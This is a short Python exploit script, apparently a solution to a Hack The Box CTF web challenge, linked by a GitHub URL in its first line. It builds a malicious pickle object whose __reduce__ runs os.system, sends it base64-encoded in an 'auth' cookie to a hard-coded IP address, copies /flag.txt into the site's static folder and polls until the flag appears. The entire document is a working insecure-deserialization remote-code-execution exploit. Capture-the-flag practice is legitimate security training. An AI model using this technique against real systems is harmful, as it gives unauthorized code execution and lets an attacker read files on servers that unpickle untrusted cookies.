#https://github.com/hackthebox/htboo-ctf-2023/tree/main/htboo-ctf-2023/web/%5BVery%20Easy%5D%20Spellbound%20Servants

import requests
import pickle
import base64
import os
import time

url = 'http://94.237.57.79:42075'

payload = f'cat /flag.txt > /app/application/static/js/flag.txt'

class RCE:
    def __reduce__(self):
        cmd = payload
        return os.system, (cmd,)

def exploit():
    pickled = pickle.dumps(RCE())
    r = requests.get(f'{url}/home', cookies={'auth': base64.urlsafe_b64encode(pickled).decode('utf-8')})
    while True:
        flag = requests.get(f'{url}/static/js/flag.txt')
        if 'HTB'.encode('utf-8') in flag.content:
            break
        time.sleep(5)

    print('[*] %s' % flag.content)

exploit()
